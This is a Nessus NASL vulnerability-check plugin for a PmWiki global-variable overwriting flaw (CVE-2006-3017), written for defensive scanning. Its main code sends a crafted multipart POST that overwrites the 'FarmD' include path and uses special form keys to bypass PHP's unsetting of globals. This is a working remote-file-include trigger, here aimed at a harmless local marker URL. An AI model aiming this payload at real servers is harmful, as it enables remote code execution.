#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22310);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2012/01/20 19:44:20 $");

  script_cve_id("CVE-2006-3017");
  script_bugtraq_id(17843);
  script_osvdb_id(25255, 26466);

  script_name(english:"PmWiki < 2.1.21 Global Variables Overwriting");
  script_summary(english:"Checks for a remote file include flaw in PmWiki");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
global variable overwriting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of PmWiki installed on the remote host contains a
programming flaw in 'pmwiki.php' that may allow an unauthenticated
remote attacker to overwrite global variables used by the application,
which could in turn be exploited to execute arbitrary PHP code on the
affected host, subject to the privileges of the web server user id. 

Note that successful exploitation of this issue requires that PHP's
'register_globals' and 'file_uploads' settings be enabled and that the
remote version of PHP be older than 4.4.3 or 5.1,4.");
  # http://www.hardened-php.net/hphp/zend_hash_del_key_or_index_vulnerability.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ccaf872d");
  script_set_attribute(attribute:"see_also", value:"http://www.pmwiki.com/wiki/PmWiki/ReleaseNotes");
  script_set_attribute(attribute:"solution", value:"Upgrade to PmWiki version 2.1.21 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/05/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/09/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:pmwiki:pmwiki");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2012 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/pmwiki", "/wiki", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure the affected script exists.
  url = string(dir, "/pmwiki.php");
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does...
  if ("pmwiki.php?n=Main.RecentChanges" >< res)
  {
    # Try to exploit the flaw.
    FamD = string("http://127.0.0.1/NESSUS/", SCRIPT_NAME);
    bound = "bound";
    boundary = string("--", bound);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="FarmD";', "\r\n",
      "\r\n",
      FamD, "\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="-1778478215";', "\r\n",
      "\r\n",
      "1\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="-1304181425";', "\r\n",
      "\r\n",
      "1\r\n",

      boundary, "--", "\r\n"
    );

    r = http_send_recv3(method: "POST", item: url + "?n=PmWiki.BasicEditing?action=edit", port: port,
      content_type: "multipart/form-data; boundary="+bound,
      data: postdata);
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if we see our FamD value in an error.
    if (string("main(", FamD, "/scripts/stdconfig.php): failed to open stream") >< res)
    {
      security_hole(port);
      exit(0);
    }
  }
}
